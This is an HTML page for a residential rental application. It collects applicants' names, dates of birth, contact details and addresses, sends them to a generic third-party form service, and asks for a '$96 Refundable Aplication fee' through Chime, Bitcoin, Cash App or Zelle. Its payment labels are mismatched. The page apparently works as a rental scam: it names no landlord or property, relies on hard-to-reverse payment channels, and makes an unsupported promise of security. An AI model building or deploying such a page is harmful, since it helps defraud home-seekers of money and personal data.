<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Residential Rental Application</title>

  <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

  <header>
    <div class="hero-text">
      <h1>Residential Rental<br>Application Form</h1>
      <p>Please fill out the form below to apply for a rental property.</p>
    </div>

    <div class="house" style="width: 190px; height: 190px;">
      <img src="House.jpeg" alt="House" style="width: 100%; height: 100%;">
    </div>
  </header>


  <form action="https://api.web3forms.com/submit" method="POST">
          <!-- Required access key -->
          <input type="hidden" name="access_key" value="59828bf6-0ac5-4fe5-bd66-3f05bec55bdc">

    <h2>Applicant's Name</h2>

    <div class="row">
      <div>
        <input type="text" name="Firstname" placeholder="First Name" required>
      </div>

      <div>
        <input type="text" name="Lastname" placeholder="Last Name" required>
      </div>
    </div>


    <label>Phone Number</label>
    <input type="tel" name="Phone" placeholder="(000) 000-0000" required>

     <label>Email</label>
    <input type="email" name="Email" placeholder="you@example.com" required>


    <label>Date of Birth</label>
    <input type="date" name="DateOfBirth" required>


    <h2 style="margin-top: 15px;margin-bottom: 15px;">Do you have a Vehicle?</h2>

    <div class="radio" style="margin-top:0px;">
      <label>
        <input type="radio" name="vehicle" value="Yes">
        Yes
      </label>

      <label>
        <input type="radio" name="vehicle" value="No">
        No
      </label>
    </div>


    <label>Occupation / Job Title?</label>
    <input type="text" name="Occupation" placeholder="e.g Engineer" required>

    <label>Number of person who will occupy the property</label>
    <input type="text" name="Occupants" placeholder="e.g 3" required>

   
      <hr style="margin-top: 15px;margin-bottom: 15px;">
    <p style="margin-top: 15px;"> Do you have pet?</p>

    <div class="radio" style="margin-top:0px;">
      <label>
        <input type="radio" name="pet" value="Yes">
        Yes
      </label>

      <label>
        <input type="radio" name="pet" value="No">
        No
      </label>
    </div>

    <label>Current Address</label>
    <input type="text" name="CurrentAddress" required>
    <label style="font-size: medium;">Street Address</label>
    <input type="text" name="StreetAddress" required>
     <label style="font-size: medium;">Street Address Line 2</label>
    <input type="text" name="StreetAddress2" required>
     <label style="font-size: medium;">City</label>
    <input type="text" name="City" required>
    <label style="font-size: medium;">State / province</label>
    <input type="text" name="State" required>
    <label style="font-size: medium;">Postal / Zip Code</label>
    <input type="text" name="PostalCode" required>
    <hr style="margin-top: 15px;margin-bottom: 15px;">

    <label>Duration of Occupancy</label>
    <input type="text" name="DurationOfOccupancy" placeholder="e.g 2 years" required>

    
    
    <label>Move In Date</label>
    <input type="date" name="MoveInDate" required>

  

    <h3 style="color: rgb(62, 62, 60); margin-top: 20px;"> $96 Refundable Aplication fee </h3>

    <p style="margin-top: 15px; margin-bottom: 10px;">Preferred payment method:</p>
    <div class="payment-options">
      <label>
        <input type="radio" name="paymentMethod" value="chime">
        Chime
      </label>

      <label>
        <input type="radio" name="paymentMethod" value="paypal">
        Bitcoin
      </label>

      <label>
        <input type="radio" name="paymentMethod" value="cashapp">
        Cash App
      </label>

      <label>
        <input type="radio" name="paymentMethod" value="zelle">
        PayPal
      </label>

     
    </div>

    <button type="submit" class="submit-button">
      Submit Application
    </button>


    <p class="security">
      🔒 Your information is secure and confidential.
    </p>


  </form>

</div>


<script src="script.js"></script>

</body>
</html>
